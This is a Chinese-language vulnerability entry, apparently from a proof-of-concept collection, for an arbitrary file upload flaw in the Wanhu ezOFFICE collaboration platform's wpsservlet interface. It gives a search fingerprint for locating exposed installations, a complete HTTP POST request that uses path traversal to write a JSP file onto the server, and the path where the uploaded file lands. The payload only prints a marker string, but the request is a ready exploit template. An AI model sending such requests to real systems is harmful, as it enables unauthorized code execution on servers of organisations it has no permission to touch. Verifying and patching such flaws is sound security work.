﻿# 万户协同办公平台ezoffice wpsservlet接口任意文件上传漏洞

> 更新时间：2023-12-11

> 漏洞编号：

> 漏洞说明：万户ezOFFICE协同管理平台是一个综合信息基础应用平台。 万户协同办公平台ezoffice wpsservlet接口存在任意文件上传漏洞。

> 漏洞特征：app="万户网络-ezOFFICE"

> 验证脚本：HTTP

```
POST /defaultroot/wpsservlet?option=saveNewFile&newdocId=40067&dir=../platform/portal/layout/&fileType=.jsp HTTP/1.1
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cache-Control: max-age=0
Content-Type: multipart/form-data; boundary=55aeb894de1521afe560c924fad7c6fb

--55aeb894de1521afe560c924fad7c6fb
Content-Disposition: form-data; name="NewFile"; filename="40067.jsp"

<% out.print("dudesuite");%>
--55aeb894de1521afe560c924fad7c6fb--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：/defaultroot/platform/portal/layout/40067.jsp


> 验证文件来源：万户协同办公平台ezoffice wpsservlet接口任意文件上传漏洞.poc
